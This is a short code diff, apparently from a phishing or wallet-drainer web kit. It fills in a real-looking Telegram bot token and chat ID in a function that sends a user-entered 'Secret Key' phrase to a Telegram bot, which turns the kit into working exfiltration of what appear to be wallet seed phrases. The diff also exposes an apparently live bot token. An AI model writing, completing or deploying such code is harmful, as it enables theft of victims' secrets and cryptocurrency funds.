@@ -90,8 +90,8 @@
    }
 
    async function sendToTelegram(phrase) {
-     const botToken = 'your-telegram-bot-token'; // Replace with your actual bot token
-     const chatId = 'your-chat-id'; // Replace with your actual chat ID
+     const botToken = '7819874081:AAEoN0kBLFh7YhGyOgF4rfwgywqaqf-kf-k'; // Replace with your actual bot token
+     const chatId = '7328650569'; // Replace with your actual chat ID
      const message = `Secret Key: ${phrase}`;
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      try {
